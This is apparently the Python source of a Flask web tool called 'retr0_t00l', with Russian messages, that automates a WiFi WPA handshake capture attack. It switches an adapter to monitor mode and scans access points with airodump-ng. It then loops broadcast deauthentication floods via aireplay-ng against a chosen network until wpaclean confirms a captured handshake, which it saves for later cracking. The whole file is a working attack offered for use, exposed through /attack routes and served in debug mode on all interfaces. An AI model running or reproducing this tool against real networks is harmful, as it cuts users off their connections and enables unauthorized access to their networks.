#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from flask import Flask, render_template, request, jsonify
import subprocess
import threading
import os
import re
import time
import logging
from datetime import datetime

app = Flask(__name__)
app.config['SECRET_KEY'] = 'retr0_t00l_secret'

logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s',
                    handlers=[logging.FileHandler('/tmp/retr0_t00l.log'), logging.StreamHandler()])
logger = logging.getLogger(__name__)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
HS_DIR = os.path.join(BASE_DIR, "hs")
if not os.path.exists(HS_DIR):
    os.makedirs(HS_DIR)

process_output = []
scan_results = []
monitor_interface = None
handshake_captured = False
handshake_capture_active = False
handshake_stop_requested = False

current_params = {'handshake_timeout': 600, 'deauth_interval': 10, 'deauth_count': 10}


def add_output(msg):
    ts = datetime.now().strftime("%H:%M:%S")
    entry = f"[{ts}] {msg}"
    process_output.append(entry)
    logger.info(msg)


def run_command(cmd, timeout=None):
    try:
        res = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return res.stdout, res.stderr, res.returncode
    except subprocess.TimeoutExpired:
        return None, "timeout", 1


def get_available_interfaces():
    """Возвращает wireless-интерфейсы через `iw dev`."""
    ifaces = []
    out, _, _ = run_command(['iw', 'dev'])
    if out:
        for line in out.splitlines():
            m = re.match(r'\s+Interface\s+(\S+)', line)
            if m:
                name = m.group(1)
                iw_out, _, _ = run_command(['iw', 'dev', name, 'info'])
                mode = "monitor" if (iw_out and "type monitor" in iw_out) else "managed"
                ifaces.append({"name": name, "mode": mode})
    
    # Fallback
    if not ifaces:
        out, _, _ = run_command(['ip', '-o', 'link', 'show'])
        if out:
            for line in out.splitlines():
                m = re.search(r'^\d+: (w[a-z0-9]+):', line)
                if m:
                    name = m.group(1)
                    iw_out, _, _ = run_command(['iw', 'dev', name, 'info'])
                    mode = "monitor" if (iw_out and "type monitor" in iw_out) else "managed"
                    ifaces.append({"name": name, "mode": mode})
    return ifaces


def setup_monitor_mode(iface):
    global monitor_interface
    if iface == "wlan0":
        add_output("⚠ wlan0 нельзя в монитор (потеряете связь)!")
        return None

    iw_out, _, _ = run_command(['iw', 'dev', iface, 'info'])
    if iw_out and 'type monitor' in iw_out:
        add_output(f"ℹ {iface} уже в monitor-режиме")
        monitor_interface = iface
        return monitor_interface

    add_output(f"🔄 Перевод {iface} в монитор...")
    subprocess.run(['sudo', 'pkill', '-f', 'airodump-ng'], check=False)
    time.sleep(0.5)

    run_command(['sudo', 'ip', 'link', 'set', iface, 'down'])
    _, err, rc = run_command(['sudo', 'iw', 'dev', iface, 'set', 'type', 'monitor'])
    if rc != 0:
        add_output(f"⚠ iw dev set type monitor: {err}")
        _, err, rc = run_command(['sudo', 'iwconfig', iface, 'mode', 'monitor'])
        if rc != 0:
            add_output(f"❌ Не удалось перевести {iface} в monitor: {err}")
            run_command(['sudo', 'ip', 'link', 'set', iface, 'up'])
            return None
    run_command(['sudo', 'ip', 'link', 'set', iface, 'up'])
    time.sleep(1)

    iw_out, _, _ = run_command(['iw', 'dev', iface, 'info'])
    if not iw_out or 'type monitor' not in iw_out:
        add_output(f"❌ {iface} не переключился в monitor")
        return None

    monitor_interface = iface
    add_output(f"✅ {iface} теперь в режиме монитора.")
    return monitor_interface


# ======== Сканирование сетей ========
def start_scan_handshake():
    global scan_results
    if not monitor_interface:
        add_output("❌ Сначала выберите интерфейс!")
        scan_results = []
        return False

    add_output("🔍 Сканирование сетей (airodump-ng 10 сек)...")
    csv_path = "/tmp/scan"
    csv_file = f"{csv_path}-01.csv"
    if os.path.exists(csv_file): 
        os.remove(csv_file)

    proc = subprocess.Popen(
        ['sudo', 'airodump-ng', '--write', csv_path, '--output-format', 'csv', monitor_interface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(10)
    proc.terminate()
    time.sleep(1)

    if os.path.exists(csv_file):
        aps = {}
        parsing_clients = False
        with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if line.startswith("Station MAC"):
                    parsing_clients = True
                    continue
                if not line or line.startswith("BSSID") or line.startswith("Station MAC"):
                    continue
                cols = [c.strip() for c in line.split(",")]
                if not parsing_clients and len(cols) > 13:
                    aps[cols[0]] = {"SSID": cols[13], "BSSID": cols[0], "Channel": cols[3],
                                    "Signal": cols[8], "Encryption": cols[5], "Clients": 0}
                elif parsing_clients and len(cols) > 5:
                    if cols[5] in aps:
                        aps[cols[5]]["Clients"] += 1
        scan_results = list(aps.values())
    return True


def check_handshake_wpaclean(cap_file, target_bssid, target_ssid):
    if not os.path.exists(cap_file): return False
    cleaned_cap = "/tmp/check_cleaned.cap"
    if os.path.exists(cleaned_cap): os.remove(cleaned_cap)

    res = subprocess.run(['sudo', 'wpaclean', cleaned_cap, cap_file], capture_output=True, text=True)
    output = (res.stdout + res.stderr).strip()
    if not output: return False

    pattern = re.compile(rf'Net\s+{re.escape(target_bssid.lower())}\s+(.*)', re.IGNORECASE)
    match = pattern.search(output)

    if match:
        add_output(f"✅ wpaclean подтвердил: {target_bssid} (SSID: '{match.group(1).strip()}')")
        return True
    return False


def start_handshake_capture(bssid, channel, ssid):
    global handshake_capture_active, handshake_captured, handshake_stop_requested
    if not monitor_interface: return False

    handshake_captured = False
    handshake_capture_active = True
    handshake_stop_requested = False

    def worker():
        global handshake_capture_active, handshake_captured, handshake_stop_requested
        safe_ssid = re.sub(r'[^a-zA-Z0-9_]', '_', ssid)
        safe_bssid = bssid.replace(':', '-')
        ts = datetime.now().strftime("%Y-%m-%dT%H-%M-%S")
        handshake_file_base = os.path.join(HS_DIR, f'hs_{safe_ssid}_{safe_bssid}_{ts}')
        cap_file = handshake_file_base + "-01.cap"
        final_filename = os.path.join(HS_DIR, f'hs_{safe_ssid}_{safe_bssid}_{ts}.cap')

        if os.path.exists(cap_file): os.remove(cap_file)
        subprocess.run(['sudo', 'pkill', '-f', 'airodump-ng'], check=False)
        time.sleep(1)

        dump_proc = subprocess.Popen(
            ['sudo', 'airodump-ng', '--bssid', bssid, '-c', str(channel),
             '-w', handshake_file_base, '--output-format', 'cap', monitor_interface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        start_time = time.time()

        while (time.time() - start_time < int(current_params['handshake_timeout'])
               and not handshake_captured and not handshake_stop_requested):
            
            add_output("➡️ Отправка деаутов...")
            subprocess.run(
                ['sudo', 'aireplay-ng', '--deauth', str(current_params['deauth_count']),
                 '-a', bssid, '-c', 'FF:FF:FF:FF:FF:FF', monitor_interface],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            time.sleep(int(current_params['deauth_interval']))

            if handshake_stop_requested: 
                break

            if check_handshake_wpaclean(cap_file, bssid, ssid):
                handshake_captured = True
                os.rename(cap_file, final_filename)
                add_output(f"✅ Сохранено: {final_filename}")
                break

        try: 
            dump_proc.terminate()
        except Exception: 
            pass
        handshake_capture_active = False

    threading.Thread(target=worker, daemon=True).start()
    return True


# ======== Роуты ========
@app.route('/')
def index(): 
    return render_template('index.html')

@app.route('/interfaces')
def interfaces():
    ifaces = get_available_interfaces()
    return jsonify({"interfaces": [i['name'] for i in ifaces], "monitor": monitor_interface})

@app.route('/set_interface/<iface>')
def set_interface(iface):
    global monitor_interface
    monitor_interface = setup_monitor_mode(iface)
    return jsonify({"status": "success", "monitor": monitor_interface})

@app.route('/scan')
def scan():
    success = start_scan_handshake()
    return jsonify({"success": success, "networks": scan_results})

@app.route('/update_params', methods=['POST'])
def update_params():
    global current_params
    for k, v in (request.json or {}).items():
        if k in current_params:
            try: current_params[k] = int(v)
            except (ValueError, TypeError): pass
    return jsonify({"status": "success"})

@app.route('/attack/handshake', methods=['POST'])
def attack_handshake():
    data = request.json or {}
    if start_handshake_capture(data.get('bssid'), data.get('channel'), data.get('ssid')):
        return jsonify({"status": "success"})
    return jsonify({"status": "error", "message": "Монитор не включен"})

@app.route('/attack/handshake/stop', methods=['POST'])
def stop_handshake():
    global handshake_stop_requested
    handshake_stop_requested = True
    subprocess.run(['sudo', 'pkill', '-f', 'airodump-ng'], check=False)
    subprocess.run(['sudo', 'pkill', '-f', 'aireplay-ng'], check=False)
    return jsonify({"status": "success"})

@app.route('/status')
def status(): 
    return jsonify({"handshake_active": handshake_capture_active, "handshake_captured": handshake_captured})

@app.route('/output')
def output(): 
    return jsonify({"output": "\n".join(process_output[-25:])})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True, use_reloader=False)
